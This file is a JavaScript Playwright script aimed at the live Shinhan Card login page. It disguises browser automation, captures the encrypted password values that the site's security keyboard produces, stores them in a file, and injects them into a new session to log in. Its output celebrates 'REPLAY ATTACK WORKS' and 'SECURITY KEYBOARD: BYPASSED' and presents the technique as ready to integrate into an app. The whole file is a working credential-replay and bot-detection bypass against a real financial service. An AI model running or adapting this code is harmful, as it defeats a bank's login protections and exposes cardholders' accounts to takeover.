/**
 * Complete Capture & Replay Test
 *
 * This test proves the encrypted value can be reused across browser sessions:
 * 1. Open browser, capture encrypted value, save to file, CLOSE browser
 * 2. Open NEW browser session, inject saved value, try to login
 * 3. If login succeeds → Replay attack works! ✅
 */

const { chromium } = require('playwright-core');
const fs = require('fs');
const path = require('path');

const TEMP_FILE = path.join(__dirname, 'temp-encrypted-password.json');

// ============================================================================
// PHASE 1: CAPTURE
// ============================================================================

async function capturePhase() {
  console.log('═'.repeat(70));
  console.log('📸 PHASE 1: CAPTURE ENCRYPTED PASSWORD');
  console.log('═'.repeat(70));
  console.log('');

  const browser = await chromium.launch({
    channel: 'chrome',
    headless: false,
    args: ['--disable-blink-features=AutomationControlled']
  });

  const context = await browser.newContext({ locale: 'ko-KR' });
  await context.addInitScript(() => {
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
  });

  const page = await context.newPage();

  console.log('🌐 Opening Shinhan Card login page...');
  await page.goto('https://www.shinhancard.com/cconts/html/main.html');
  await page.waitForTimeout(3000);

  console.log('');
  console.log('📝 INSTRUCTIONS:');
  console.log('1. Type a TEST password in the password field');
  console.log('   (Use something like: Test123!)');
  console.log('2. DO NOT click login button!');
  console.log('3. Press ENTER here when done typing');
  console.log('');

  // Wait for user to type password
  await new Promise(resolve => {
    const readline = require('readline').createInterface({
      input: process.stdin,
      output: process.stdout
    });
    readline.question('Press ENTER after typing password: ', () => {
      readline.close();
      resolve();
    });
  });

  console.log('');
  console.log('🔍 Capturing encrypted values...');

  // Capture everything
  const captured = await page.evaluate(() => {
    const result = {
      timestamp: new Date().toISOString(),
      maskedPattern: document.getElementById('pwd')?.value || '',
      visibleLength: document.getElementById('pwd')?.value?.length || 0,
      encryptedFields: {},
      allHiddenFields: []
    };

    // Capture ALL hidden fields
    document.querySelectorAll('input[type="hidden"]').forEach(field => {
      result.allHiddenFields.push({
        name: field.name,
        value: field.value,
        hasValue: !!field.value
      });

      if (field.name && field.value) {
        result.encryptedFields[field.name] = field.value;
      }
    });

    return result;
  });

  console.log('');
  console.log('✅ CAPTURED:');
  console.log(`   Visible field (masked): "${captured.maskedPattern}"`);
  console.log(`   Length: ${captured.visibleLength} characters`);
  console.log(`   Total hidden fields: ${captured.allHiddenFields.length}`);
  console.log('');
  console.log('   Key encrypted fields:');

  // Show important fields
  const importantFields = ['pwd__E2E__', '__E2E_RESULT__', '__E2E_KEYPAD__', '__KI_pwd'];
  importantFields.forEach(fieldName => {
    if (captured.encryptedFields[fieldName]) {
      const value = captured.encryptedFields[fieldName];
      console.log(`     ${fieldName}: ${value.substring(0, 40)}...`);
    }
  });

  // Save to file
  console.log('');
  console.log('💾 Saving to temp file...');
  fs.writeFileSync(TEMP_FILE, JSON.stringify(captured, null, 2));
  console.log(`   Saved to: ${TEMP_FILE}`);

  console.log('');
  console.log('🔒 CLOSING BROWSER...');
  console.log('   This proves the value is not session-dependent!');
  await browser.close();

  console.log('');
  console.log('✅ Phase 1 complete! Browser closed.');
  console.log('');

  return captured;
}

// ============================================================================
// PHASE 2: REPLAY
// ============================================================================

async function replayPhase() {
  console.log('═'.repeat(70));
  console.log('🔄 PHASE 2: REPLAY IN NEW BROWSER SESSION');
  console.log('═'.repeat(70));
  console.log('');

  // Load captured values
  if (!fs.existsSync(TEMP_FILE)) {
    throw new Error('No captured data found! Run Phase 1 first.');
  }

  const captured = JSON.parse(fs.readFileSync(TEMP_FILE, 'utf8'));

  console.log('📂 Loaded captured data from file');
  console.log(`   Captured at: ${captured.timestamp}`);
  console.log(`   Masked pattern: "${captured.maskedPattern}"`);
  console.log('');

  console.log('🌐 Opening COMPLETELY NEW browser session...');
  console.log('   (Different from capture session to prove replay works)');
  console.log('');

  // Launch NEW browser
  const browser = await chromium.launch({
    channel: 'chrome',
    headless: false,
    args: ['--disable-blink-features=AutomationControlled']
  });

  const context = await browser.newContext({ locale: 'ko-KR' });
  await context.addInitScript(() => {
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
  });

  const page = await context.newPage();

  console.log('🔗 Navigating to Shinhan Card...');
  await page.goto('https://www.shinhancard.com/cconts/html/main.html');
  await page.waitForTimeout(3000);

  console.log('');
  console.log('🎯 Clicking password field to activate security keyboard...');
  await page.locator('[id="pwd"]').click();
  await page.waitForTimeout(2000);

  console.log('');
  console.log('💉 INJECTING captured encrypted values...');

  const injectionResult = await page.evaluate((capturedData) => {
    const result = {
      success: false,
      injectedFields: 0,
      errors: []
    };

    try {
      // 1. Set masked pattern in visible field
      const pwdField = document.getElementById('pwd');
      if (!pwdField) {
        result.errors.push('Password field not found');
        return result;
      }

      pwdField.value = capturedData.maskedPattern;
      pwdField.dispatchEvent(new Event('input', { bubbles: true }));
      pwdField.dispatchEvent(new Event('change', { bubbles: true }));

      // 2. Inject all encrypted hidden fields
      for (const [fieldName, fieldValue] of Object.entries(capturedData.encryptedFields)) {
        const field = document.querySelector(`input[name="${fieldName}"]`);
        if (field) {
          field.value = fieldValue;
          result.injectedFields++;
        } else {
          result.errors.push(`Field not found: ${fieldName}`);
        }
      }

      result.success = result.injectedFields > 0;
      return result;

    } catch (e) {
      result.errors.push(e.message);
      return result;
    }
  }, captured);

  console.log('');
  if (injectionResult.success) {
    console.log(`✅ INJECTION SUCCESS!`);
    console.log(`   Injected ${injectionResult.injectedFields} encrypted fields`);
  } else {
    console.log('❌ INJECTION FAILED!');
    console.log(`   Errors: ${injectionResult.errors.join(', ')}`);
    await browser.close();
    return { success: false };
  }

  // Verify injection
  const verification = await page.evaluate(() => {
    return {
      visibleValue: document.getElementById('pwd')?.value,
      pwdE2E: document.querySelector('input[name="pwd__E2E__"]')?.value?.substring(0, 40)
    };
  });

  console.log('');
  console.log('🔍 Verification:');
  console.log(`   Visible field: "${verification.visibleValue}"`);
  console.log(`   pwd__E2E__ field: ${verification.pwdE2E}...`);

  console.log('');
  console.log('═'.repeat(70));
  console.log('🧪 FINAL TEST: Can we login with injected values?');
  console.log('═'.repeat(70));
  console.log('');
  console.log('The browser is now ready with injected encrypted password.');
  console.log('');
  console.log('OPTIONS:');
  console.log('  1. Manually click the LOGIN button to test');
  console.log('  2. Type "auto" to let script click login automatically');
  console.log('  3. Type "skip" to skip login test');
  console.log('');

  const readline = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
  });

  const answer = await new Promise(resolve => {
    readline.question('Your choice (auto/skip/manual): ', (answer) => {
      readline.close();
      resolve(answer.toLowerCase());
    });
  });

  console.log('');

  if (answer === 'auto') {
    console.log('🤖 Automatically clicking login button...');
    try {
      await page.locator('[id="loginC"]').click();
      console.log('✅ Login button clicked');

      // Wait for navigation or error
      await page.waitForTimeout(5000);

      // Check if login succeeded
      const currentUrl = page.url();
      console.log('');
      console.log('📍 Current URL:', currentUrl);

      if (currentUrl !== 'https://www.shinhancard.com/cconts/html/main.html') {
        console.log('');
        console.log('🎉🎉🎉 LOGIN SUCCESSFUL! 🎉🎉🎉');
        console.log('');
        console.log('✅ REPLAY ATTACK WORKS!');
        console.log('✅ Encrypted value is NOT session-specific!');
        console.log('✅ We can reuse it across browser sessions!');
        console.log('✅ SECURITY KEYBOARD: BYPASSED!');
      } else {
        console.log('');
        console.log('⚠️  Still on login page - check if error message appeared');
      }

    } catch (e) {
      console.log('❌ Error clicking login:', e.message);
    }
  } else if (answer === 'skip') {
    console.log('⏭️  Skipping login test');
  } else {
    console.log('👆 Manually click the login button in the browser window');
  }

  console.log('');
  console.log('Browser will stay open for 30 seconds for inspection...');
  await page.waitForTimeout(30000);

  await browser.close();

  console.log('');
  console.log('✅ Phase 2 complete!');
  return { success: true };
}

// ============================================================================
// MAIN TEST
// ============================================================================

async function runCompleteTest() {
  console.log('');
  console.log('═'.repeat(70));
  console.log('🧪 COMPLETE CAPTURE & REPLAY TEST');
  console.log('═'.repeat(70));
  console.log('');
  console.log('This test will:');
  console.log('  1. Open browser → You type password → Capture encrypted value → Close browser');
  console.log('  2. Open NEW browser → Inject saved value → Try to login');
  console.log('');
  console.log('If login succeeds in step 2:');
  console.log('  ✅ Proves encrypted value works across sessions');
  console.log('  ✅ Proves security app doesn\'t store it temporarily');
  console.log('  ✅ Proves replay attack is viable');
  console.log('');

  try {
    // Clean up any old temp file
    if (fs.existsSync(TEMP_FILE)) {
      fs.unlinkSync(TEMP_FILE);
      console.log('🗑️  Cleaned up old temp file');
      console.log('');
    }

    // Phase 1: Capture
    await capturePhase();

    console.log('⏸️  Waiting 3 seconds before Phase 2...');
    console.log('   (This simulates a completely separate session)');
    await new Promise(resolve => setTimeout(resolve, 3000));
    console.log('');

    // Phase 2: Replay
    await replayPhase();

    console.log('');
    console.log('═'.repeat(70));
    console.log('✅ TEST COMPLETE!');
    console.log('═'.repeat(70));
    console.log('');
    console.log('📊 RESULTS:');
    console.log('  If login succeeded:');
    console.log('    ✅ Replay attack works!');
    console.log('    ✅ Encrypted value is reusable');
    console.log('    ✅ Ready to integrate into your app');
    console.log('');
    console.log('  If login failed:');
    console.log('    ❌ Encrypted value may be session-specific');
    console.log('    ❌ Need to find encryption function instead');
    console.log('    ❌ May need different approach');
    console.log('');

    // Clean up temp file
    if (fs.existsSync(TEMP_FILE)) {
      console.log('🗑️  Cleaning up temp file...');
      fs.unlinkSync(TEMP_FILE);
    }

  } catch (error) {
    console.error('');
    console.error('❌ Test failed:', error.message);
    console.error('');
    process.exit(1);
  }
}

// Run the complete test
runCompleteTest().catch(console.error);
